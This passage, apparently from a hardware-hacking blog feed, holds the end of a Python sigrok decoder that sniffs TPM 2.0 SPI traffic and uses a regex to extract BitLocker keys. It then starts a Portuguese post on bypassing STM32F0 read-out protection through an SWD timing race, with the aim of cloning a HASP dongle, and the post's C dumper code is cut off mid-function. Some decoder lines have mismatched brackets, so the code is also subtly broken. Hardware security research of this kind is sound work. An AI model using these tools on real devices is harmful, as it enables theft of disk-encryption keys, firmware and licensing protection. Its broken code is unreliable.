<span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
    <span class="n">READING_OP</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">READING_ARG</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">WAITING</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="n">TRANSFER</span> <span class="o">=</span> <span class="mi">4</span>

<span class="k">class</span> <span class="nc">Decoder</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">Decoder</span><span class="p">):</span>
    <span class="n">api_version</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="sh">'</span><span class="s">tpm20</span><span class="sh">'</span>
    <span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM2.0</span><span class="sh">'</span>
    <span class="n">longname</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM 2.0</span><span class="sh">'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A TPM 2.0 Protocol Decoder</span><span class="sh">'</span>
    <span class="n">license</span> <span class="o">=</span> <span class="sh">'</span><span class="s">gplv2+</span><span class="sh">'</span>
    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">spi</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">outputs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">SPI</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">TPM</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
    <span class="n">annotations</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Text</span><span class="sh">'</span><span class="p">),</span>                   <span class="c1"># 0
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">warning</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Warning</span><span class="sh">'</span><span class="p">),</span>             <span class="c1"># 1
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 2
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 3
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 4
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 5
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">),</span> <span class="c1"># 6
</span>    <span class="p">)</span>
    <span class="n">annotation_rows</span> <span class="o">=</span> <span class="p">(</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">)),</span>
    <span class="p">)</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet read</span><span class="sh">'</span><span class="p">),</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet write</span><span class="sh">'</span><span class="p">),</span>
    <span class="p">)</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">reset</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_ANN</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_python</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_PYTHON</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_binary</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_BINARY</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">DATA</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span> <span class="o">=</span> <span class="n">data</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">putdata</span><span class="p">(</span><span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="nf">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{}: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">tpmRegisters</span><span class="p">[</span><span class="n">addr</span><span class="p">],</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">RESERVED({:06X}): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">3</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">]</span> <span class="p">])</span>

    <span class="k">def</span> <span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">5</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="p">[</span><span class="n">key</span><span class="p">))</span>

    <span class="n">opIsRead</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">numBytes</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">transactionStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">transactionEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">putdata</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">OPERATION_MASK</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span>    <span class="c1"># 1 = read, 0 = write
</span>            <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">SIZE_MASK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c1"># Minimum transfer = 1 byte
</span>            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span>
            <span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span> <span class="o">=</span> <span class="n">ss</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">mosi</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># Wait state
</span>                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Wait finished
</span>                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Read from device
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">miso</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>   <span class="c1"># Read from controller
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">mosi</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">==</span> <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span> <span class="o">=</span> <span class="n">es</span>
                <span class="c1">#print("Transaction: ", self.bytesRead)
</span>                <span class="n">self</span><span class="p">.</span><span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span> <span class="ow">and</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>

                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># 0 = Write, 1 = Read
</span>    <span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">fifoStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">fifoEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">endfifo</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="c1"># No FIFO
</span>        <span class="n">self</span><span class="p">.</span><span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Bitlocker Key: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">def</span> <span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">!=</span> <span class="n">ttype</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="n">ttype</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span> <span class="o">=</span> <span class="n">start</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span> <span class="o">=</span> <span class="n">end</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[O TPM 2.0, também conhecido como Trusted Platform Module 2.0, é um recurso de segurança de hardware que está incorporado em muitos computadores modernos. Sua finalidade é proporcionar uma maneira segura de armazenar chaves criptográficas e outros dados sensíveis, tais como senhas e certificados digitais, visando proteger contra diversas ameaças de segurança, incluindo acesso não autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolução da especificação original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptográficos adicionais e a capacidade de armazenar quantidades maiores de dados.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">STM32F0x Protected Firmware Dumper</title><link href="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper" rel="alternate" type="text/html" title="STM32F0x Protected Firmware Dumper" /><published>2024-01-16T05:23:00+00:00</published><updated>2024-01-16T05:23:00+00:00</updated><id>https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper</id><content type="html" xml:base="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper"><![CDATA[<p>No processo do meu hobby de hackear hardware, encontrei um clone chinês de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha intenção era cloná-lo, e durante minha exploração, descobri quatro pinos da interface de depuração SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.</p>

<p>Utilizando meu Segger J-Link como uma sonda de depuração, embora qualquer adaptador JTAG deva ser suficiente, eu o combinei com o OpenOCD. Dado que o chipset é reconhecido pelo OpenOCD, eu criei um script para extrair todos os dados possíveis, condicionados à habilitação.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adapter driver jlink
transport select swd
adapter_khz 4000
source [find target/stm32f0x.cfg]
init
dap info
reset halt
flash read_bank 0 firmwareF1.bin 0 0x8000
reset
shutdown
</code></pre></div></div>

<p>Mas, encontrei um obstáculo - a proteção RDP (Read-Out Protection) do dispositivo estava ativada, mesmo com o SWD ativo. Sem problemas, pensei, e tentei contornar isso com injeção de falha de tensão. No entanto, o gerador de clock interno no dispositivo tornou a interferência no clock inviável. Após algumas horas sem progresso, ficou claro que eu precisava de um novo plano.</p>

<p>Minha busca por alternativas me levou a um artigo abrangente detalhando três metodologias para extrair memória protegida:</p>

<p><a href="https://www.aisec.fraunhofer.de/en/FirmwareProtection.html">https://www.aisec.fraunhofer.de/en/FirmwareProtection.html</a></p>

<p>Tentei o Método de Boot a Frio, mas sem sucesso - provavelmente porque eu não conseguia mexer no relógio do dispositivo, e isso é praticamente um ponto crucial para que funcionasse. O método UVC? Muito arriscado, e eu não estava disposto a arruinar o dongle. Então, restou a interferência no Porta de Depuração SWD.</p>

<p>Havia uma Prova de Conceito (PoC) para esta falha, e ela tinha algumas informações boas, mas era tudo sobre código STM32 com um monte de coisas específicas do dispositivo. Eu precisava de algo mais universal. Depois de analisar a PoC e o artigo, misturei um pouco do meu próprio conhecimento e criei um novo código.</p>

<p>Para o campo de testes, conectei um Raspberry Pi Pico com <a href="http://platform.io/">platform.io</a>. Tive que ir direto com o protocolo SWD, pois sondas de depuração padrão como meu J-Link eram muito invasivas na inicialização do dispositivo. Essa falha precisava de uma ação rápida na leitura da memória flash, e cada milissegundo contava.</p>

<p>Aqui está o ponto crucial - a proteção do código só entra em ação quando você tenta tocar na memória flash com o modo de depuração ativado. Mas se você for rápido, pode capturar um DWORD da flash antes que as portas se fechem.</p>

<p>Para extrair o firmware inteiro, é uma dança com o pino de reset e a fonte de energia do dispositivo. Você tem que ciclar a energia para resetar a bandeira do modo de depuração. Aqui está o passo a passo:</p>

<ol>
  <li>Acione o pino de reset</li>
  <li>Ligue o dispositivo</li>
  <li>Solte o pino de reset</li>
  <li>Faça a leitura</li>
  <li>Corte a energia</li>
  <li>Repita o processo</li>
</ol>

<p>O Raspberry Pi Pico foi tudo o que eu precisei para alimentar o dispositivo, já que o STM32 não consome muita energia. Se você estiver lidando com algo que exija mais energia, um transistor ou relé para alternar a energia pode ser a solução. Você pode conferir toda a operação e o código em <a href="https://github.com/racerxdl/stm32f0-pico-dump">https://github.com/racerxdl/stm32f0-pico-dump</a> ou disponível abaixo.</p>

<p><img src="/assets/posts/patreon/Pasted image 20230124035820.png" alt="Dump funcionando de bytes" />
<em>Uma imagem mostrando fluxos de dados DWORD do firmware STM32F0 sendo transmitidos em tempo real via porta serial do Raspberry Pi Pico, iluminando o terminal com linhas de código extraído.</em></p>

<h2 id="code">Code</h2>

<h3 id="halc">hal.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">targetInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">targetPowerOff</span><span class="p">();</span>
    <span class="n">targetReset</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetRestore</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="readerc">reader.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cm">/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */</span>
<span class="n">swdStatus_t</span> <span class="nf">extractFlashData</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">dbgStatus</span><span class="p">;</span>

    <span class="cm">/* Add some jitter on the moment of attack (may increase attack effectiveness) */</span>
